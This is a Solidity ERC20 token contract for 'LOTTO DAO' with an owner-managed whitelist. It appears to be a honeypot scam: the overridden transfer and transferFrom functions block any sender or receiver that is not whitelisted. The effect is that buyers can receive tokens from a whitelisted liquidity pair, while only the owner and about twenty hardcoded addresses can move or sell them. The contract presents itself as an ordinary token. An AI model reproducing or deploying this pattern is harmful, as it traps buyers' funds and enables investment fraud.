// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("LOTTO DAO", "LTD") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 52000000 * 10 ** decimals());
        whiteList[0x0001450da93c30f74d0F51091897F8CA427a9948]= true;
        whiteList[0x23d30624ab6a85d72337d2C8A7D2282C2D3FA3fF]=true;
        whiteList[0xd2b8D9CC0Cf2b5d23887CA307D6D9d8Ca7fD45B9]=true;
        whiteList[0xcc6a90bA5356Bc0C8362867E9D4E9AC36EB94049]=true;
        whiteList[0x61136A7D70E28bd2B3b7a8337FF521E523702441]=true;
        whiteList[0xEC3537D19B3eC7277a84391d5A9F24aF4e9bBeD7]=true;
        whiteList[0x77Bc78DcfC43C68D927e78365d599fADc58eC461]=true;
        whiteList[0x59F53A58b8133395C842D2EA809B921E74cf2277]=true;
        whiteList[0x0046102Fa1161Dbc981dff4305e875b7bE3D8479]=true;
        whiteList[0xB307fc5e52F76c5fA2F1BD34cDefc8189958C1e3]=true;
        whiteList[0x62261819f9e3227f921042D131F61F0b1bE4DFB8]=true;
        whiteList[0x5BcBC6151c86Aa8FC1c2f7E6D386A67E9ebc0636]=true;
        whiteList[0x757F5111D2099B21D02bd1C51FD85a0fd695cCC6]=true;
        whiteList[0xdbbDa86B3363F68d494C43d04C31D8548f0ea794]=true;
        whiteList[0xB129C230e62CDED0F4c7673bA6f8DbeDb51235f7]=true;
        whiteList[0xeCA1D173401d604B66Ed81C189bB9cA703bCA24f]=true;
        whiteList[0xcD29F38266480a1d3e76A89B6FEbB4954cB99EBD]=true;
        whiteList[0xC495752D1bBC78F6A4757dD907A99A2841259251]=true;
        whiteList[0x0Efb770598aCaF8155C1451E0c4888bdB9205967]=true;
        whiteList[0x8286ffc211C0AbD6C14200628D969451a421E6FC]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}